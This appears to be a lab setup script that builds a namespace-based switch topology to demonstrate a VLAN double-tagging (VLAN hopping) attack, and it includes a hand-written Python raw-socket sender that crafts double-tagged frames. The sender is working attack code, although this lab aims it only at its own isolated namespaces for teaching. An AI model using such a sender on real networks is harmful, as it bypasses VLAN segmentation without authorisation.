# One switch, a trunk leaving it, and a frame that arrives on the trunk carrying
# a tag its sender was never allowed to use.
#
#   atk --- sw1 === trunk === mon
#   access      native vlan 1, and vlan 20 tagged
#   vlan 1
#
# The attacker is on an access port in VLAN 1, which is also the trunk's native
# VLAN. The trunk sends the native VLAN untagged, which is the whole of the
# problem: a switch that sends one VLAN without a tag has to strip a tag to do
# it. The attacker sends a frame with two tags, an outer VLAN 1 and an inner
# VLAN 20. The switch reads the outer tag, accepts the frame as VLAN 1 traffic
# because that is what the port carries, and then removes the VLAN 1 tag on the
# way out of the native trunk. What crosses the trunk is a VLAN 20 frame, which
# is a VLAN the attacker has no access to.
#
# mon is not a second switch, it is a monitor. Capturing on the wire is what
# shows the frame changing shape, which is the fact the figure on the page draws
# and this topology proves. A real second switch would simply deliver it.
#
# The attacker gets a double-tag sender at /root/dtag.py. No library: it writes
# two 802.1Q headers by hand, which is the point, because a reader should see
# that the frame is ordinary bytes and the switch is doing something reasonable
# with them.
NETLAB_PACKAGES="iproute2 iputils-ping tcpdump python3"
NETLAB_SETTLE=1

ip netns add sw1
ip -n sw1 link set lo up
ip netns exec sw1 sh -c "echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6"
ip -n sw1 link add br0 type bridge vlan_filtering 1
ip -n sw1 link set br0 up

# The attacker, on an access port.
ip netns add atk
ip -n atk link set lo up
ip netns exec atk sh -c "echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6"
ip link add atk0 type veth peer name sw1-atk
ip link set atk0 netns atk
ip link set sw1-atk netns sw1
ip -n atk link set atk0 address 02:00:00:00:00:aa
ip -n atk link set atk0 up
ip -n sw1 link set sw1-atk master br0
ip -n sw1 link set sw1-atk up

# The monitor at the far end of the trunk.
ip netns add mon
ip -n mon link set lo up
ip netns exec mon sh -c "echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6"
ip link add t1 type veth peer name t2
ip link set t1 netns sw1
ip link set t2 netns mon
ip -n sw1 link set t1 master br0
ip -n sw1 link set t1 up
ip -n mon link set t2 up

# VLANs. The default VLAN 1 sits on every port already; the work is adding VLAN
# 20 to the trunk as a tagged VLAN and making VLAN 1 the untagged native there.
# The attacker port stays a plain access port in VLAN 1 and is never given VLAN
# 20, which is the access it does not have and takes anyway.
bridge -n sw1 vlan add dev sw1-atk vid 1 pvid untagged
bridge -n sw1 vlan add dev t1 vid 1 pvid untagged
bridge -n sw1 vlan add dev t1 vid 20

# A sender that writes VLAN tags into an Ethernet frame by hand. Arguments:
# interface, outer VID, and an inner VID where 0 means send only one tag. The
# destination is broadcast so the capture does not depend on knowing a victim MAC.
ip netns exec atk sh -c 'cat > /root/dtag.py' <<'PY'
import socket, struct, sys
iface, outer, inner = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))
src = s.getsockname()[4]
dst = b"\xff\xff\xff\xff\xff\xff"
q = lambda vid: struct.pack("!HH", 0x8100, vid)
ipa = lambda x: socket.inet_aton(x)
# The payload is an ARP request as if the sender were on the VLAN 20 subnet, so
# the capture reads as ordinary traffic wherever the frame ends up.
arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1) + src + ipa("10.0.20.66") + bytes(6) + ipa("10.0.20.9")
body = struct.pack("!H", 0x0806) + arp
if inner:
    frame = dst + src + q(outer) + q(inner) + body
    print("sent a frame tagged outer vlan %d, inner vlan %d" % (outer, inner))
else:
    frame = dst + src + q(outer) + body
    print("sent a frame with one tag, vlan %d" % outer)
s.send(frame)
PY
